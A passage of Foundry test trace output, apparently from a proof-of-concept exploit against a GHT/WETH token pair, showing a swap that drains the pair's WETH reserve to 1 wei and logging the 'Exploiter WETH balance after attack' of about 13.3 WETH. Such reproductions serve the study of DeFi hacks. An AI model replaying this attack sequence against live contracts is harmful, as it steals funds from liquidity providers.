    │   │   ├─ emit Transfer(from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13299999999999999999 [1.329e19])
    │   │   └─ ← [Return] true
    │   ├─ [979] GHT::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   │   ├─ [581] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [delegatecall]
    │   │   │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    │   │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    │   ├─ [534] WETH::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ emit Sync(reserve0: 450000000000000000000000 [4.5e23], reserve1: 1)
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 449999999999999999999999 [4.499e23], amount1In: 0, amount0Out: 0, amount1Out: 13299999999999999999 [1.329e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 13299999999999999999 [1.329e19]
    ├─ [444] WETH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 13299999999999999999 [1.329e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 31.51s (2.83s CPU time)

Ran 2 test suites in 31.90s (31.77s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
